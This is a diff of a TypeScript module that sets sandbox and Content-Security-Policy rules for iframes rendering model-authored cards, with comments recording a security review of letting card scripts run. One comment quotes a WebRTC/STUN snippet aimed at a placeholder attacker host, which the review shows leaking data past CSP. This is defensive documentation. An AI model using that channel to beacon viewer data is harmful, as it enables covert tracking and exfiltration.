@@ -20,8 +20,10 @@
 //     app's own origin. It is not expressible in `<meta>` (the spec ignores
 //     `sandbox`/`frame-ancestors`/`report-uri` there), which is the second reason the routed arm is the
 //     primary and srcdoc is the floor. Since the 2026-08-16 tier-B pass that navigation is no longer
-//     script-DEAD — it runs the one hash-pinned height script (which posts to itself and does nothing) —
-//     but every CARD-authored script stays refused, by hash, in a frame and at top level alike.
+//     script-DEAD — it runs the one hash-pinned height script (which posts to itself and does nothing).
+//     On the `static` posture every CARD-authored script stays refused by hash, in a frame and at top
+//     level alike; on the `interactive` posture (#111 leg 3) card scripts run — inside the same opaque
+//     origin, which is why the `sandbox` directive matters more after the grant, not less.
 //
 // ── FRAME NAVIGATION (measured 2026-08-16, Chromium via playwright-ct; #111 leg 2 — the tier-B review's
 //    one UNVERIFIED control, and the prerequisite #110 named for the interactive grant) ────────────────────
@@ -40,15 +42,52 @@
 //   • a `<form action="https://elsewhere">` submit — REFUSED (`form-action 'none'`, this document's own).
 //   • a `<meta http-equiv="refresh">` — REFUSED. Note this one needs NO script, so it is reachable under
 //     today's posture and is not something an interactivity grant would newly enable.
-//   • LAB ARM — the same probe with `script-src 'unsafe-inline'` (the leg-3 proposal, built in the test, NOT
-//     here): card code RUNS (positive control: it stamps the body) and STILL reaches no navigation —
-//     `top.location` and `window.open` die on the sandbox, and `location.href` off-origin dies on the app's
-//     `default-src 'self'`, exactly as the script-free link does. Chromium leaves the refused frame at an
-//     empty `about:blank`.
-// CONSEQUENCE for leg 3: granting card-authored scripts adds NO navigation reach a static card does not
-// already have. The belt is the APP document's CSP, so the residual to state is that a deployment which
-// ever widens the app policy's frame-src (or serves a card frame from a page with a looser policy) loses
-// this control for BOTH postures at once.
+//   • the INTERACTIVE posture (since #111 leg 3 this is the SHIPPED policy, not a lab arm): card code RUNS
+//     (positive control: it stamps the body) and STILL reaches no navigation — `top.location` and
+//     `window.open` die on the sandbox, and `location.href` off-origin dies on the app's `default-src
+//     'self'`, exactly as the script-free link does. Chromium leaves the refused frame at an empty
+//     `about:blank`.
+// CONSEQUENCE, now settled: the script grant adds NO navigation reach a static card does not already have.
+// The belt is the APP document's CSP — which is why `entry/http/security-headers.ts` now names `frame-src
+// 'self'` EXPLICITLY instead of leaning on the `default-src` fallback: the residual was that a deployment
+// widening `default-src` for some unrelated reason would silently widen frame navigation for BOTH postures
+// at once. Serving a card frame from a page with a looser policy would still lose the control.
+//
+// ── THE INTERACTIVE GRANT'S REACH CENSUS (measured 2026-08-16, #111 leg 3 — the security pass; Chromium
+//    149.0.7827.55, two REAL http servers so "did it land" is a hit counter on the far end, never a
+//    devtools event) ───────────────────────────────────────────────────────────────────────────────────
+// QUESTION: with `script-src 'unsafe-inline'`, what NEW reach does a card-authored script buy?
+// ANSWER: over HTTP, none at all. The same three off-origin requests land with scripts and without them:
+//   • floor media (`img-src 'self'`), script-free card → NOTHING lands off-origin.
+//   • floor media, SCRIPTED card → NOTHING lands off-origin. `fetch`/XHR/`WebSocket`/`EventSource`/
+//     `sendBeacon` are refused by `default-src 'none'` (no `connect-src`, deliberately); an external
+//     `<script src>` and a `blob:`/`data:` Worker are refused by the `script-src`/`worker-src` fallback
+//     ('unsafe-inline' matches no URL, so naming `worker-src 'none'` would be a directive with nothing to
+//     add); a nested `<iframe>` is refused by the `frame-src` fallback; `eval`/`new Function` throw
+//     EvalError (no `'unsafe-eval'`).
+//   • external media ON, script-free card → `<img>`, `<link rel=prefetch>`, `<video>` land.
+//   • external media ON, SCRIPTED card → EXACTLY the same three. Nothing new.
+// So the HTTP exfil channel is the media allowance, it predates the grant, and it stays behind the
+// deployment "Block external media" ceiling. What the grant changes is not WHICH channel exists but what
+// can be encoded in it: a script composes a URL from what it observed, where authored markup could only
+// carry a constant.
+// The frame's isolation holds under script: `document.cookie`, `localStorage`, `parent.document` and a
+// SIBLING card frame's document all throw SecurityError, and a sibling frame cannot be navigated
+// ("Unsafe attempt to initiate navigation for frame …"). A card CAN `postMessage` the embedder and its
+// siblings; the embedder's listener authenticates by window identity and folds only a clamped height
+// ({@link foldCardFrameHeight}), and a card document has no message listener at all.
+//
+// RESIDUAL R1 — WEBRTC, AND IT IS NOT CLOSEABLE HERE. An interactive card ran
+// `new RTCPeerConnection({iceServers:[{urls:"stun:<attacker>:<port>"}]})` and FOUR STUN binding requests
+// arrived at an attacker-chosen host:port on a real UDP listener. Reproduced on a plain-http LAN origin
+// (`isSecureContext === false`), so the secure-context gate does NOT contain it. `webrtc 'block'` — the
+// CSP3 directive for exactly this — is reported "Unrecognized" by Chromium 149, so emitting it would be
+// dead config teaching the next reader a lie; it is NOT emitted. This channel is outside `connect-src`
+// AND outside the external-media ceiling: an interactive card can beacon a view-receipt, a fingerprint,
+// or anything a viewer is socially engineered into typing INSIDE the frame, on any deployment. It cannot
+// reach the session, storage, the app DOM, or another card. THE ONLY CONTROL IS NOT SERVING THE POSTURE —
+// which is why the deployment ceiling below is a precondition of the grant rather than a convenience, and
+// why its floor is OFF.
 //
 // ── THE COOKIE CEILING (measured in the same probe; corrects a claim that stood in two docs) ──────────────
 // An opaque-origin document's same-origin subresource fetch is `Sec-Fetch-Site: cross-site`, so a
@@ -74,62 +113,56 @@ export type CardFrameDelivery = (typeof CARD_FRAME_DELIVERIES)[number];
  * (`@orb/ui` sandbox-frame reads this record) and the CSP `sandbox` DIRECTIVE below. They were two constants
  * in two packages that a comment asked a reviewer to keep in sync; they are one value indexed by arm now.
  *
- * TIER-B TRUST REVIEW, 2026-08-16 (security-executor pass, #91), ARM B — the MINIMAL grant:
- *   • `document` (routed) = `allow-scripts`, paired in the SAME policy with `script-src` naming ONE hash:
- *     {@link CARD_FRAME_HEIGHT_SCRIPT}. Our measurement script runs; a card-authored `<script>`, `on*=`
- *     handler or `javascript:` URL hashes differently and is refused — the card author gains NOTHING. No
- *     `'unsafe-inline'`, no `'unsafe-hashes'`, no `'unsafe-eval'`, no host source, and still no
- *     `connect-src`, so the one capability bought is "measure yourself and tell the parent".
+ * TIER-B TRUST REVIEW, 2026-08-16 (security-executor pass, #91), ARM B — the MINIMAL grant, and it did NOT
+ * move when #111 leg 3 granted card scripts:
+ *   • `document` (routed) = `allow-scripts`. Which scripts may run is decided ENTIRELY by `script-src` in
+ *     the same policy ({@link CARD_FRAME_SCRIPT_SOURCES}) — one hash on the `static` posture, the card's
+ *     own code on `interactive`. The sandbox is what makes either safe to say: opaque origin, no cookies,
+ *     no storage, no reach into the app DOM, no top navigation, no popups, no forms.
  *   • `meta` (srcdoc floor) = EMPTY, every restriction on. A srcdoc document also inherits the app CSP
  *     (`script-src 'self'`), so a hash we do not also add to the APP policy could never match there —
  *     granting the flag would buy nothing and spend a belt. The floor stays script-dead; that arm keeps
  *     the fixed pre-measurement height and that is the accepted outcome (#91's defect is routed cards).
  * NEVER `allow-same-origin` on either arm (that combo lets the frame reach into the app origin and lets it
- * remove its own sandbox). The FULL artifact-sandbox posture — `script-src 'unsafe-inline'`, i.e. running
- * model-authored card JS, the §12.2 "doored, not walled" trusted-card interactivity — is NOT granted here
- * and still owes its own security pass.
+ * remove its own sandbox) — and the grant made that NEVER load-bearing rather than theoretical: with card
+ * code executing, `allow-same-origin` would hand a model-authored script the app's session and DOM.
  */
 export const CARD_FRAME_SANDBOX = { document: "allow-scripts", meta: "" } as const satisfies Record<CardFrameDelivery, string>;
 
 /**
- * The card document's SCRIPT POSTURE — the per-document selection seam (#111 leg 1), and the ONE row leg 3's
- * security pass has to move to grant interactive cards.
+ * The card document's SCRIPT POSTURE — the per-document selection seam (#111 leg 1), GRANTED by leg 3's
+ * security pass (2026-08-16).
  *
- *   • `static` — only OUR hash-pinned measurement script may execute. Every card gets this today, and it is
- *     the DEFAULT for every card nobody opted in (an imported card included).
- *   • `interactive` — the host opted THIS character's cards into running their own scripts
- *     — the TOP RUNG of the one ordered html-trust ladder (`RenderPolicy.htmlTrust`, contracts/chat:
- *     `untrusted` then `trusted` then `interactive`), resolved off the `characters.interactive_html` beside
- *     `trust_html`. The same per-character host consent D44 uses to grant the tierB sandbox, one rung up;
- *     interactive IMPLIES trusted by construction, so a frame in this posture always has the `data:` door.
+ *   • `static` — only OUR hash-pinned measurement script may execute. The DEFAULT for every card nobody
+ *     opted in (an imported card included), and still what an opted-in card gets whenever the deployment
+ *     ceiling is off.
+ *   • `interactive` — the host opted THIS character's cards into running their own scripts, AND the
+ *     deployment allows it. The TOP RUNG of the one ordered html-trust ladder (`RenderPolicy.htmlTrust`,
+ *     contracts/chat: `untrusted` then `trusted` then `interactive`), resolved off the
+ *     `characters.interactive_html` column against the `allowInteractiveCards` AppSetting. Interactive
+ *     IMPLIES trusted by construction, so a frame in this posture always has the `data:` door too.
  *
- * **NO GRANT EXISTS YET.** `CARD_FRAME_SCRIPT_SOURCES` below gives both arms the SAME single hash, so an
- * interactive-flagged card is byte-identical to a static one on the wire: the SELECTION is live and
- * observable (the mint echoes it as `granted.interactive`), the CAPABILITY is not. That split is the
- * program's whole shape — #91's tier-B pass declined to ride a product-scale capability grant on a layout
- * fix, so the grant is reserved for a second security-executor pass which owns the `interactive` row and
- * nothing else in this file.
+ * TWO CONSENTS, AND BOTH ARE REQUIRED (the leg-3 ruling). The per-character opt-in is the HOST's; the
+ * `allowInteractiveCards` AppSetting is the DEPLOYMENT OPERATOR's, it is an AND (never `override ??`), and
+ * its floor is OFF. It is a precondition rather than a convenience because of residual R1 in the header
+ * above: the grant opens a WebRTC/STUN channel that no CSP directive in Chromium can close, so "may
+ * model-authored code run in a viewer's browser at all" is a decision the box's operator has to take
+ * knowingly. Leg 1 also shipped an editor that told users the rung was inert ("card scripts stay switched
+ * off until the security review lands"), so opt-ins already stored were given under a different
+ * representation — a fleet-wide default-ON upgrade would activate them without anyone re-deciding.
  *
- * The sandbox grant does NOT vary by posture: the reviewed target is still `allow-scripts` alone (never
- * `allow-same-origin`, never `allow-top-navigation`/`allow-forms`/`allow-popups`) and only `script-src`
- * moves — so {@link CARD_FRAME_SANDBOX} stays keyed by delivery alone.
+ * The sandbox grant does NOT vary by posture: it is still `allow-scripts` alone (never `allow-same-origin`,
+ * never `allow-top-navigation`/`allow-forms`/`allow-popups`) and only `script-src` moves — so
+ * {@link CARD_FRAME_SANDBOX} stays keyed by delivery alone.
  *
- * TRUTH-REPAIR (2026-08-16, this lane): #110/#111 both say the per-card knob "is NOT BUILT" and name
+ * TRUTH-REPAIR (2026-08-16, leg 1): #110/#111 both said the per-card knob "is NOT BUILT" and named
  * `config.features.immersiveHtmlInteractive` as the thing to build. That knob EXISTS and is something else:
  * `contracts/rpg/config.ts` (`default(true)`) drives which TEACHING prose slot the rpg reminder emits
  * (`domain/rpg/substrate/reminder.ts` — `rpg.card.askInteractive` vs `rpg.card.askStatic`). It is per-GAME,
  * defaults ON, shapes the PROMPT, and the program spec that introduced it explicitly REJECTED gating the
  * render on it ("a stored interactive card would break on a later toggle-off"). So it could not be the
  * selector for a script grant: it does not exist for a non-game chat, it says nothing about an imported
- * card, and a prompt-shaping default-on switch is not a security consent. The knob built here is the one
- * #110's SYMPTOM asks for — per-card, default OFF, homed with the render-trust consent it belongs to — and
- * the rpg ask-knob is untouched.
- *
- * OPEN FOR LEG 3 (recorded here rather than built, because a kill-switch that gates nothing is
- * scaffolding): there is NO deployment-tier ceiling for the top rung. It resolves from the per-character
- * override ALONE ({@link https://github.com/Inktomi93/orbweaver/issues/111}) while the render step below it
- * and the external-media axis each have an AppSettings tier. Whether a fleet-wide off switch is a
- * precondition of the grant is the security pass's call.
+ * card, and a prompt-shaping default-on switch is not a security consent. The rpg ask-knob is untouched.
  */
 export const CARD_FRAME_POSTURES = ["static", "interactive"] as const;
 export type CardFramePosture = (typeof CARD_FRAME_POSTURES)[number];
@@ -156,17 +189,40 @@ export const CARD_FRAME_HEIGHT_SCRIPT =
  *  which is the gate: change the script without re-pinning and the suite REDs before the policy ships. */
 export const CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH = "'sha256-X4P6ct+XbYLNF4Q5h+h/1nJEA0TD7k/6cHZe/VxxMI0='";
 
-/** The `script-src` sources per POSTURE, `document` delivery only (the `meta` floor names none — a srcdoc
- *  document inherits the app's `script-src 'self'`, so a hash we did not also add to the APP policy could
- *  never match there). BOTH ROWS ARE THE SAME TODAY, deliberately — see {@link CARD_FRAME_POSTURES}. Leg 3
- *  moves the `interactive` row and only that row. */
+/** The one keyword that turns the posture into a capability. Named so the grant is greppable and so the
+ *  `static` row can assert against it by identity rather than by a re-typed string. */
+const UNSAFE_INLINE = "'unsafe-inline'";
+
+/**
+ * The `script-src` sources per POSTURE, `document` delivery only (the `meta` floor names none — a srcdoc
+ * document inherits the app's `script-src 'self'`, so a hash we did not also add to the APP policy could
+ * never match there).
+ *
+ * THE INTERACTIVE ROW REPLACES THE HASH; IT DOES NOT JOIN IT. That is not a style choice — measured
+ * 2026-08-16 (Chromium 149), a policy of `script-src 'unsafe-inline' 'sha256-…'` REFUSES the card's script
+ * and says why: *"Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the
+ * source list."* (CSP3 §"Match element to source list": the keyword is skipped whenever the list carries a
+ * nonce- or hash-source.) An appended grant would therefore have read as live and granted nothing — the
+ * dead-opt-in class this repo hunts. {@link CARD_FRAME_HEIGHT_SCRIPT} still runs on this arm because it is
+ * ITSELF an inline script, so the height channel needs no second allowance and no exception.
+ *
+ * What the interactive row deliberately does NOT name, each with a measured reason in the header's reach
+ * census: no `'unsafe-eval'` (eval/`new Function` throw), no host or scheme source (an external
+ * `<script src>` is refused, so a card cannot pull remote code at render), no `worker-src` of its own (the
+ * fallback to this directive already refuses `blob:`/`data:` workers), no `webrtc` (unrecognized by the
+ * browser — R1), and still no `connect-src` anywhere, so `default-src 'none'` keeps the fetch/socket/beacon
+ * family closed under BOTH postures.
+ */
 const CARD_FRAME_SCRIPT_SOURCES = {
   static: [CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH],
-  interactive: [CARD_FRAME_HEIGHT_SCRIPT_CSP_HASH],
+  interactive: [UNSAFE_INLINE],
 } as const satisfies Record<CardFramePosture, readonly string[]>;
 
 /** The height channel's clamp. The message is UNTRUSTED input from a document whose body is model-authored,
- *  so the number it reports is an assertion, not a measurement we made.
+ *  so the number it reports is an assertion, not a measurement we made — and on the `interactive` posture
+ *  it is an assertion the CARD can make directly (its own script may `postMessage` whatever it likes; the
+ *  static arm's hash is what stopped that). The clamp is therefore the whole defence, and the worst an
+ *  interactive card buys itself is the cap: 720px, which it could already occupy by authoring tall content.
  *  • FLOOR: a card that reports 0 (or a hostile 1) must not collapse to an invisible hairline the reader
  *    cannot see or hit — one touch target is the smallest thing that still reads as an object.
  *  • CAP: the failure mode the clamp exists for is unbounded growth. 720px is about the mobile viewport
@@ -285,10 +341,10 @@ function mediaSources(policy: CardFrameMediaPolicy, delivery: CardFrameDelivery)
  * `style-src 'unsafe-inline'` is the card's whole point — the sandbox, not a nonce, is the guard.
  *
  * The DOCUMENT arm additionally names `script-src`, whose sources come from the document's POSTURE
- * ({@link CARD_FRAME_POSTURES}) — the only place scripts are nameable at all, and today one hash on both
- * arms. The META arm names none (and takes no posture), so `default-src 'none'` keeps covering script-src
- * there. The posture is REQUIRED rather than defaulted: a call site that has not decided which document it
- * is building must say `"static"` out loud, not inherit it from an argument it forgot.
+ * ({@link CARD_FRAME_POSTURES}) — the only place scripts are nameable at all, and the ONLY directive the
+ * posture moves. The META arm names none (and takes no posture), so `default-src 'none'` keeps covering
+ * script-src there. The posture is REQUIRED rather than defaulted: a call site that has not decided which
+ * document it is building must say `"static"` out loud, not inherit it from an argument it forgot.
  */
 export function buildCardFrameCsp(policy: CardFrameMediaPolicy, delivery: CardFrameDelivery, posture: CardFramePosture): string {
   const media = mediaSources(policy, delivery);
